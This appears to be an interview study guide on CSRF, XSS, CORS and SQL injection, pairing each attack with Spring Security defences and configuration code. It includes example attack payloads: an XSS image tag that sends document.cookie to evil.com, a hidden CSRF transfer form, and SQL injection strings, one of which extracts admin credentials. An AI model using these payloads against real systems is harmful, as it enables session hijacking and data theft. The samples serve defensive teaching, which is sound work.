# System Design Interview: Security Attacks & Spring Security Mitigations

## 1. CSRF (Cross-Site Request Forgery)

### What is CSRF?
Attacker tricks an authenticated user into making an unintended request to another site.

**Attack Example:**
```
User logs into bank.com and forgets to logout.
User visits evil.com (in another tab).
Evil.com has a hidden form that submits to bank.com/transfer:
  <form action="http://bank.com/transfer.funds" method="POST">
    <input name="account" value="attacker_account"/>
    <input name="amount" value="1000000"/>
    <input type="submit" value="Click me!"/>
  </form>
Browser sends bank.com's session cookie automatically → unauthorized transfer happens.
```

### Spring Security: Synchronizer Token Pattern (STP)
Spring generates a unique CSRF token for each session/request. Token must be embedded in form/header.
Attacker on evil.com can't access this token → request is blocked.

**How Form Should Look:**
```html
<form action="http://bank.com/transfer" method="POST">
  <input type="hidden" name="${_csrf.parameterName}" value="${_csrf.token}"/>
  <input type="hidden" name="account" value="attacker_account"/>
  <input type="submit"/>
</form>
```

**Spring Config (Default Enabled):**
```java
@Configuration
@EnableWebSecurity
public class SecurityConfig {
    @Bean
    public SecurityFilterChain filterChain(HttpSecurity http) throws Exception {
        http
            .csrf(Customizer.withDefaults())  // Enabled by default
            .authorizeRequests()
                .anyRequest().authenticated()
            .and()
            .formLogin();
        return http.build();
    }
}
```

**For SPA/Mobile (Send token in header):**
```java
http
    .csrf(csrf -> csrf
        .csrfTokenRepository(CookieCsrfTokenRepository.withHttpOnlyFalse())
    );
```

Then client reads token from cookie and sends it via `X-CSRF-TOKEN` header.

---

## 2. XSS (Cross-Site Scripting)

### What is XSS?
Attacker injects malicious JavaScript into a web page viewed by other users.

**Attack Example:**
```
User comment: <img src=x onerror="alert('XSS');fetch('evil.com/steal-data?cookie='+document.cookie)"/>

When displayed without sanitization:
- Script executes
- Steals session cookies
- Redirects to phishing site
```

### 3 Types:
1. **Stored XSS** - Malicious script saved in database, executed on retrieval
2. **Reflected XSS** - Script in URL parameter, reflected back in response
3. **DOM-based XSS** - JavaScript modifies DOM with untrusted data

### Spring Security Defense Layers:

**Layer 1: Output Encoding (Template Engines)**
```java
// Thymeleaf auto-escapes by default
<p th:text="${userComment}"></p>  <!-- HTML-safe -->

// BUT this doesn't escape:
<p th:utext="${userComment}"></p>  <!-- UNSAFE - use only for trusted content -->
```

**Layer 2: Content-Security-Policy (CSP)**
```java
http
    .headers(headers -> headers
        .contentSecurityPolicy(csp -> csp
            .policyDirectives(
                "script-src 'self' https://trusted.com; " +
                "object-src 'none'; " +
                "report-uri /csp-report"
            )
        )
    );
```

This tells browser:
- Only load scripts from our domain or trusted.com
- Block inline scripts & event handlers
- Report violations to /csp-report endpoint

**Layer 3: HTTPOnly Cookie Flag (Default in Spring)**
```java
// Prevents JavaScript from accessing cookies
// Spring sets this automatically
```

**Layer 4: Input Validation**
```java
@PostMapping("/comment")
public void saveComment(@RequestParam String text) {
    // Whitelist allowed characters
    if (!text.matches("^[a-zA-Z0-9\\s.,!?-]+$")) {
        throw new IllegalArgumentException("Invalid characters");
    }
    // ... save
}
```

**Layer 5: X-XSS-Protection Header (Legacy)**
```java
http
    .headers(headers -> headers
        .xssProtection(xss -> xss.block(true))
    );
// Sends: X-XSS-Protection: 1; mode=block
```

---

## 3. CORS (Cross-Origin Resource Sharing)

### What is CORS?
**Same-Origin Policy (SOP):** Browser blocks requests to different origins (scheme, host, port).

**Origin Comparison (with base: http://store.com:80):**
```
http://store.com/page      → Same origin (path differs, ignored)
https://store.com/page     → Different (protocol https vs http)
http://store.com:81/page   → Different (port 81 vs 80)
http://api.store.com/page  → Different (subdomain differs)
```

### CORS Attack Risk:
```
User logs into bank.com
User opens evil.com in another tab
evil.com makes JavaScript request to bank.com API:
  fetch('http://bank.com/api/transfer', {
    method: 'POST',
    headers: {'Content-Type': 'application/json'},
    body: JSON.stringify({to: 'attacker', amount: 1000})
  })

Browser blocks this! (CORS prevents read access to cross-origin response)
BUT if bank.com responds with CORS headers, browser allows it.
```

### Spring Security CORS Configuration:

**Allowing Specific Origins:**
```java
@Configuration
public class CorsConfig {
    @Bean
    public WebMvcConfigurer corsConfigurer() {
        return new WebMvcConfigurer() {
            @Override
            public void addCorsMappings(CorsRegistry registry) {
                registry.addMapping("/api/**")
                    .allowedOrigins("https://trusted-frontend.com")
                    .allowedMethods("GET", "POST", "PUT", "DELETE")
                    .allowedHeaders("*")
                    .allowCredentials(true)
                    .maxAge(3600);
            }
        };
    }
}
```

**Via Spring Security:**
```java
http
    .cors(cors -> cors.configurationSource(request -> {
        CorsConfiguration config = new CorsConfiguration();
        config.setAllowedOrigins(Arrays.asList("https://trusted.com"));
        config.setAllowedMethods(Arrays.asList("GET", "POST"));
        config.setAllowedHeaders(Arrays.asList("*"));
        config.setAllowCredentials(true);
        return config;
    }))
```

### Browser CORS Flow:
```
1. Browser makes preflight OPTIONS request
2. Server responds with Access-Control-* headers
3. Browser checks headers - if origin allowed, sends actual request
4. Otherwise, blocks response (still fetched by browser, but JavaScript can't read it)
```

**Key Headers:**
- `Access-Control-Allow-Origin: https://trusted.com`
- `Access-Control-Allow-Methods: GET, POST`
- `Access-Control-Allow-Headers: Content-Type, Authorization`
- `Access-Control-Allow-Credentials: true`

⚠️ **Never use:** `Access-Control-Allow-Origin: *` with `Allow-Credentials: true`

---

## 4. SQL Injection

### What is SQL Injection?
Attacker manipulates SQL query by injecting malicious input.

**Attack Example:**
```
Input: ' OR '1'='1'--
Query: SELECT * FROM users WHERE username = '' OR '1'='1'--' AND password = '?'
Becomes: SELECT * FROM users WHERE username = '' OR '1'='1'
Result: Returns ALL users!
```

**Union Injection:**
```
Input: ' UNION ALL SELECT username, password FROM admin_users WHERE '1'='1
Query: SELECT name, email FROM users WHERE id = '' UNION ALL SELECT username, password FROM admin_users WHERE '1'='1'
Result: Leaks admin credentials!
```

### Spring Security: Parameterized Queries (Prepared Statements)

**WRONG (Vulnerable):**
```java
String userId = request.getParameter("id");
String sql = "SELECT * FROM users WHERE id = '" + userId + "'";
// If userId = "1' OR '1'='1", query becomes: SELECT * FROM users WHERE id = '1' OR '1'='1'
```

**CORRECT (Safe):**
```java
// Method 1: PreparedStatement with ?
String sql = "SELECT * FROM users WHERE id = ?";
PreparedStatement stmt = connection.prepareStatement(sql);
stmt.setString(1, userId);  // Safely bound as data, not code
ResultSet rs = stmt.executeQuery();
```

**Spring Data JPA (Safe by default):**
```java
@Query("SELECT u FROM User u WHERE u.id = :id")
User findById(@Param("id") String id);  // Safe - uses PreparedStatement internally
```

**Native Query (Safe if using parameters):**
```java
@Query(value = "SELECT * FROM users WHERE id = :id", nativeQuery = true)
User findById(@Param("id") String id);  // Safe with :id binding
```

**WRONG with Native Query:**
```java
@Query(value = "SELECT * FROM users WHERE id = '" + id + "'", nativeQuery = true)
// DON'T DO THIS - vulnerable!
```

**NamedParameterJdbcTemplate (Spring way):**
```java
Map<String, Object> params = new HashMap<>();
params.put("userId", userId);
String sql = "SELECT * FROM users WHERE id = :userId";
List<User> users = template.query(sql, params, new UserRowMapper());
```

**Key Mechanism:**
- Query structure sent to database first
- Database creates execution plan for that query
- Parameters bound AFTER plan created → treated as pure data
- Attacker's SQL syntax becomes literal string value

---

## 5. Spring Security Header Protections (Comprehensive Config)

```java
@Configuration
@EnableWebSecurity
public class SecurityConfig {
    
    @Bean
    public SecurityFilterChain filterChain(HttpSecurity http) throws Exception {
        http
            // CSRF
            .csrf(csrf -> csrf.csrfTokenRepository(
                CookieCsrfTokenRepository.withHttpOnlyFalse()
            ))
            
            // Headers (XSS, Clickjacking, MIME-sniffing protection)
            .headers(headers -> headers
                // Prevents clickjacking (embedding in iframe)
                .frameOptions(frame -> frame.deny())
                
                // Prevents MIME-sniffing (e.g., .txt executed as .js)
                .contentTypeOptions(Customizer.withDefaults())
                
                // XSS Protection (legacy header)
                .xssProtection(xss -> xss.block(true))
                
                // CSP for XSS defense
                .contentSecurityPolicy(csp -> csp
                    .policyDirectives(
                        "script-src 'self'; " +
                        "object-src 'none'; " +
                        "frame-ancestors 'none'"
                    )
                )
                
                // HSTS (force HTTPS)
                .httpStrictTransportSecurity(hsts -> hsts
                    .includeSubDomains(true)
                    .maxAgeInSeconds(31536000)
                )
            )
            
            // CORS
            .cors(cors -> cors.configurationSource(request -> {
                CorsConfiguration config = new CorsConfiguration();
                config.setAllowedOrigins(Arrays.asList("https://trusted.com"));
                config.setAllowedMethods(Arrays.asList("GET", "POST", "PUT"));
                config.setAllowedHeaders(Arrays.asList("*"));
                config.setAllowCredentials(true);
                return config;
            }))
            
            .authorizeRequests()
                .anyRequest().authenticated()
            .and()
            .formLogin();
            
        return http.build();
    }
}
```

---

## 6. Default Security Headers Added by Spring

```
Cache-Control: no-cache, no-store, max-age=0, must-revalidate
Pragma: no-cache
Expires: 0
X-Content-Type-Options: nosniff                    ← Prevents MIME-sniffing
Strict-Transport-Security: max-age=31536000        ← Enforces HTTPS
X-Frame-Options: DENY                              ← Prevents clickjacking
X-XSS-Protection: 1; mode=block                    ← Legacy XSS protection
```

---

## Interview Cheat Sheet

| Attack | Root Cause | Defense | Spring Config |
|--------|-----------|---------|---|
| **CSRF** | Cookies auto-sent with requests | CSRF Token in form/header | `csrf(Customizer.withDefaults())` |
| **XSS** | User input not escaped | Output encoding + CSP | `contentSecurityPolicy(csp -> ...)` |
| **CORS** | Browser allows requests, SOP only blocks reads | Strict CORS policy | `cors(cors -> cors.configurationSource(...))` |
| **SQL Injection** | Input concatenated into query | Parameterized queries | `@Param` in @Query, PreparedStatement |

**Key Principles:**
- **Never trust user input** - validate & sanitize
- **Defense in depth** - multiple layers (encoding, CSP, headers, parameters)
- **Secure defaults** - Spring has good defaults, don't disable unless needed
- **HTTPOnly cookies** - prevent XSS cookie theft
- **Parameterized queries** - only way to prevent SQL injection
